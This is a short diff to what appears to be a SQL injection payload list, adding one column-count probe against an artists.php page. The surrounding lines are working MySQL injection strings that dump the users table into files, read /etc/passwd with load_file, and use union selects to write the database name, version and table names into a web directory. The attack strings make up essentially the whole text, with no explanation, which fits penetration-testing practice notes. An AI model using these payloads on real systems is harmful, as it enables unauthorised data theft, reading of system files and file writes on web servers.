@@ -929,6 +929,7 @@ select * from users into outfile "/tmp/test.txt"
 select * from users into dumpfile "/tmp/test.txt"
 select load_file("/etc/passwd");
 select load_file("/etc/passwd") into outfile "/tmp/eee";
+artists.php?artist=-1')) order by 4 --+
 artists.php?artist=-1 union select 1,2,3 into outfile "/hj/var/www/test1.txt" --+
 artists.php?artist=-1 union select 1,database(),version() into outfile "/hj/var/www/test1.txt" --+
 artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables into outfile "/hj/var/www/test1.txt" --+
